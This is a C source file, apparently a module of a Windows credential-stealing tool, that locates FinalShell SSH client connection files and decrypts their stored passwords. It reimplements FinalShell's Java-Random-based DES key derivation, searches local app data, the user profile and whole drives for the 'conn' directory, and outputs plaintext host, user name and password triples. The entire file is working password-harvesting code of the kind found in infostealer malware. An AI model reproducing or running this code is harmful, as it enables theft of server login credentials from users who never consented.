/* FinalShell with global search */
#include "finalshell.h"
#include "browser/utils.h"
#include "browser/crypto.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include "tinycrypto.h"

/* Java Random LCG */
typedef struct { int64_t seed; } JRandom;
static JRandom* jr_new(int64_t s){JRandom*r=malloc(sizeof(JRandom));r->seed=(s^0x5DEECE66DLL)&((1LL<<48)-1);return r;}
static int64_t jr_next(JRandom*r,int b){r->seed=(r->seed*0x5DEECE66DLL+0xB)&((1LL<<48)-1);int64_t v=r->seed>>(48-b);if(v<(1LL<<(b-1)))return v;return v-(1LL<<b);}
static int64_t jr_next_long(JRandom*r){return(jr_next(r,32)<<32)+jr_next(r,32);}

static int g_ilist[]={
24,54,89,120,19,49,85,115,14,44,80,110,9,40,75,106,43,73,109,12,38,68,104,7,33,64,99,3,28,59,94,125,
112,16,51,82,107,11,46,77,103,6,41,72,98,1,37,67,4,35,70,101,0,30,65,96,122,25,61,91,117,20,56,86,74,
104,13,43,69,99,8,38,64,95,3,34,59,90,125,29,93,123,32,62,88,119,27,58,83,114,22,53,79,109,17,48,35,66,
101,5,31,61,96,0,26,56,92,122,21,51,87,117,55,85,120,24,50,80,116,19,45,75,111,14,40,71,106,10,50,81,
116,20,45,76,111,15,41,71,106,10,36,66,102,5,69,100,8,39,65,95,3,34,60,90,126,29,55,85,121,24,12,42,78,
108,7,37,73,103,2,33,68,99,124,28,63,94,31,61,97,0,26,57,92,123,21,52,87,118,17,47,82,113,100,4,39,70,
96,126,34,65,91,121,30,60,86,116,25,55,120,23,58,89,115,18,54,84,110,13,49,79,105,9,44,75,62,92,1,31,
57,88,123,27,52,83,118,22,48,78,113,17,81,112,20,51,76,107,15,46,72,102,10,41,67,97,6,36};

static uint8_t* random_key(const uint8_t head[8]){
    int i=g_ilist[head[5]];
    int64_t ks=3680984568597093857LL/i;
    JRandom*r1=jr_new(ks);for(int j=0;j<head[0];j++)jr_next_long(r1);
    int64_t n=jr_next_long(r1);JRandom*r2=jr_new(n);
    int64_t ld[]={head[4],jr_next_long(r2),head[7],head[3],jr_next_long(r2),head[1],jr_next_long(r1),head[2]};
    free(r1);free(r2);
    uint8_t*stream=malloc(64);
    for(int j=0;j<8;j++){uint64_t v=(uint64_t)ld[j];for(int k=0;k<8;k++)stream[j*8+7-k]=(uint8_t)(v>>(k*8));}
    uint8_t hash[16];md5_hash(stream,64,hash);free(stream);
    uint8_t*key=malloc(8);memcpy(key,hash,8);return key;
}

static char* decode_pass(const char* data){
    if(!data||!*data)return NULL;
    int dl;uint8_t*buf=malloc(strlen(data));if(!buf)return NULL;
    dl=base64_decode(data,buf,(int)strlen(data));
    if(dl<8){free(buf);return NULL;}
    uint8_t head[8];memcpy(head,buf,8);
    uint8_t*key=random_key(head);
    int dlen=dl-8;if(dlen%8!=0){free(buf);free(key);return NULL;}
    uint8_t*dec=malloc(dlen+1);if(!dec){free(buf);free(key);return NULL;}
    des_ctx dctx;des_setkey(&dctx,key);
    for(int i=0;i<dlen;i+=8)des_ecb_crypt(&dctx,buf+8+i,dec+i,1);
    int plen=dlen;
    for(int i=0;i<dlen;i++){if(dec[i]<32||dec[i]>126){plen=i;break;}}
    dec[plen]=0;
    free(buf);free(key);return(char*)dec;
}

static char* json_str(const char* json, const char* key){
    char pat[128];snprintf(pat,sizeof(pat),"\"%s\"",key);
    const char*p=strstr(json,pat);if(!p)return NULL;
    p=strchr(p+strlen(pat),':');if(!p)return NULL;p++;
    while(*p==' '||*p=='"')p++;
    const char*e=strchr(p,'"');if(!e)return NULL;
    int len=(int)(e-p);char*r=malloc(len+1);memcpy(r,p,len);r[len]=0;return r;
}

static void scan_dir(const char* dir, char* result, int* rp, int max_result){
    if(!path_exists(dir))return;
    char srch[MAX_PATH];snprintf(srch,sizeof(srch),"%s\\*.json",dir);
    WIN32_FIND_DATAA fd;HANDLE hf=FindFirstFileA(srch,&fd);
    if(hf==INVALID_HANDLE_VALUE)return;
    do{if(fd.cFileName[0]=='.')continue;
        char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\%s",dir,fd.cFileName);
        FILE*f=fopen(fp,"rb");if(!f)continue;
        fseek(f,0,SEEK_END);long sz=ftell(f);fseek(f,0,SEEK_SET);
        if(sz<=0||sz>65536){fclose(f);continue;}
        char*js=malloc(sz+1);if(!js){fclose(f);continue;}
        if(fread(js,1,sz,f)!=(size_t)sz){free(js);fclose(f);continue;}
        js[sz]=0;fclose(f);
        char*host=json_str(js,"host");char*user=json_str(js,"user_name");char*pass=json_str(js,"password");
        if(host&&user&&pass){char*dp=decode_pass(pass);if(dp){*rp+=snprintf(result+*rp,max_result-*rp,"Host: %s, User: %s, Pass: %s\n",host,user,dp);free(dp);}}
        free(host);free(user);free(pass);free(js);
    }while(FindNextFileA(hf,&fd));
    FindClose(hf);
}

const char* finalshell_scan(const char* custom_path){
    static char result[65536];int rp=0;result[0]=0;

    if(custom_path&&custom_path[0]){scan_dir(custom_path,result,&rp,sizeof(result));if(result[0])return result;}
    /* Search multiple locations */
    char base[MAX_PATH];
    bool finalshell_seen = false;
    if(SUCCEEDED(SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA,NULL,0,base))){
        char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\finalshell\\conn",base);if(path_exists(fp))finalshell_seen=true;scan_dir(fp,result,&rp,sizeof(result));
    }
    GetEnvironmentVariableA("LOCALAPPDATA",base,sizeof(base));
    if(base[0]){char fp[MAX_PATH];snprintf(fp,sizeof(fp),"%s\\finalshell\\conn",base);if(path_exists(fp))finalshell_seen=true;scan_dir(fp,result,&rp,sizeof(result));}
    if(process_exists("finalshell.exe"))finalshell_seen=true;
    /* Search for 'conn' directory recursively only after FinalShell evidence exists. */
    if(!result[0]&&finalshell_seen){char up[MAX_PATH];GetEnvironmentVariableA("USERPROFILE",up,sizeof(up));
        char*found=find_dir_recursive(up,"conn",5);if(found){scan_dir(found,result,&rp,sizeof(result));free(found);}}
    /* Search C: D: for finalshell dir only after evidence exists. */
    if(!result[0]&&finalshell_seen){const char*ds[]={"C:\\","D:\\",NULL};
        for(int di=0;ds[di];di++){char*f=find_dir_recursive(ds[di],"finalshell",5);
            if(f){
                char conn_dir[MAX_PATH];
                snprintf(conn_dir,sizeof(conn_dir),"%s\\conn",f);
                if(path_exists(conn_dir)) scan_dir(conn_dir,result,&rp,sizeof(result));
                else scan_dir(f,result,&rp,sizeof(result));
                free(f);
                if(result[0])break;
            }}}
    if(!result[0])snprintf(result,sizeof(result),"FinalShell conn directory not found. Searched: %%LOCALAPPDATA%%\\finalshell\\conn, USERPROFILE, C:\\, D:\\.\n");
    return result;
}
